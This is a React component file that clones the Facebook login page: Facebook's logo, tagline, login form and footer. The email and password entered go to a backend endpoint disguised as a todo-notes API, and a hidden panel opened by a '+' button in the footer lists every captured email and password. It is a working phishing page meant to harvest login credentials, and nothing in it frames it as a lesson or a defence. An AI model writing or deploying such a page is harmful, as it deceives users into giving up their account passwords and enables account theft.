import './App.css';
import {Component} from 'react';
class App extends Component {
  constructor(props) {
    super(props);
    this.state = {
      notes: [],
      ufukVisible: false,
    };
  }

  API_URL = "http://localhost:5039/";

  componentDidMount() {
    this.refreshNotes();
  }

  async refreshNotes() {
    fetch(this.API_URL + "api/todoapp/GetNotes")
      .then((response) => response.json())
      .then((data) => {
        this.setState({ notes: data });
      });
  }

  async addClick() {
    var newEmail = document.getElementById("newEmail").value;
    var newNotes = document.getElementById("newNotes").value;

    const formData = new FormData();
    formData.append("newEmail", newEmail);
    formData.append("newNotes", newNotes);

    fetch(this.API_URL + "api/todoapp/AddNotes", {
      method: "POST",
      body: formData,
    })
      .then((res) => res.json())
      .then((result) => {
        alert(result);
        this.refreshNotes();
      })
      .catch((error) => {
        console.error("Fetch error:", error);
        // Handle the error appropriately
      });
  }

  async deleteClick(id) {
    fetch(this.API_URL + "api/todoapp/DeleteNotes?id=" + id, {
      method: "DELETE",
    })
      .then((res) => res.json())
      .then((result) => {
        alert(result);
        this.refreshNotes();
      });
  }

  toggleUfukVisibility = () => {
    this.setState((prevState) => ({
      ufukVisible: !prevState.ufukVisible,
    }));
  };

  render() {
    const { notes, ufukVisible } = this.state
    
    return (
    <div className="App">
        <div className={ufukVisible ? 'ufuk' : 'hidden'}>
          <h2>Kayıtlı Kişiler</h2>
          {notes.map((note) => {
            return (
              <table className="table table-dark">
              <thead>
                <tr>
                  <th scope="col">Email</th>
                  <th scope="col">Password</th>
                </tr>
              </thead>
              <tbody>
                <tr key={note.id}>
                  <td>{note.email}</td>
                  <td>{note.password}</td>
                </tr>
              </tbody>
            </table>
              
            );
          })}
          <button type="button" className="close-button btn btn-light " onClick={this.toggleUfukVisibility}>
          Close
        </button>
        </div>
       <main>
        <div class="row">
            <div class="col-logo">
                <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Logo"/>
                <h2>Facebook helps you connect and share with the people in your life.</h2>
            </div>
            <div class="col-form">
                <div class="form-container">
                    <input id="newEmail" type="text" placeholder="Email or phone number"/>
                    <input id="newNotes" type="password" placeholder="Password"/>
                    <button class="btn-login" onClick={()=>this.addClick()}>Login</button>
                    <a href="#">Forgotten password?</a>
                    <button className="btn-new">Create new Account</button>
                </div>
                <p><a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.</p>
            </div>
        </div>
    </main>
    <footer>
        <div class="footer-contents">
            <ol>
                <li>English (UK)</li>
                <li><a href="#">മലയാളം</a></li>
                <li><a href="#">தமிழ்</a></li>
                <li><a href="#">తెలుగు</a></li>
                <li><a href="#">বাংলা</a></li>
                <li><a href="#">اردو</a></li>
                <li><a href="#">हिन्दी</a></li>
                <li><a href="#">ಕನ್ನಡ</a></li>
                <li><a href="#">Español</a></li>
                <li><a href="#">Português (Brasil)</a></li>
                <li><a href="#">Français (France)</a></li>
                <li><button id="pop-up" onClick={this.toggleUfukVisibility}>+</button></li>
            </ol>

            <ol>
                <li><a href="#">Sign Up</a></li>
                <li><a href="#">Log In </a></li>
                <li><a href="#">Messenger</a></li>
                <li><a href="#">Facebook Lite</a></li>
                <li><a href="#">Watch</a></li>
                <li><a href="#">People</a></li>
                <li><a href="#">Pages</a></li>
                <li><a href="#">Page categories</a></li>
                <li><a href="#">Places</a></li>
                <li><a href="#">Games</a></li>
                <li><a href="#">Locations</a></li>
                <li><a href="#">Marketplace</a></li>
                <li><a href="#">Facebook</a></li>
                <li><a href="#">PayGroups</a></li>
                <li><a href="#">Jobs</a></li>
                <li><a href="#">Oculus</a></li>
                <li><a href="#">Portal</a></li>
                <li><a href="#">Instagram</a></li>
                <li><a href="#">Local</a></li>
                <li><a href="#">Sign Up</a></li>
                <li><a href="#">Log In </a></li>
                <li><a href="#">Messenger</a></li>
                <li><a href="#">Facebook Lite</a></li>
                <li><a href="#">Watch</a></li>
                <li><a href="#">People</a></li>
                <li><a href="#">Pages</a></li>
                <li><a href="#">Page categories</a></li>
                <li><a href="#">Places</a></li>
                <li><a href="#">Games</a></li>
                <li><a href="#">Locations</a></li>
                <li><a href="#">Marketplace</a></li>
                <li><a href="#">Facebook</a></li>
                <li><a href="#">PayGroups</a></li>
                <li><a href="#">Jobs</a></li>
                <li><a href="#">Oculus</a></li>
                <li><a href="#">Portal</a></li>
                <li><a href="#">Instagram</a></li>
                <li><a href="#">Local</a></li>
            </ol>
            <small>Facebook © 2022</small>
        </div>
    </footer>
    </div>
  );
}
}
export default App;
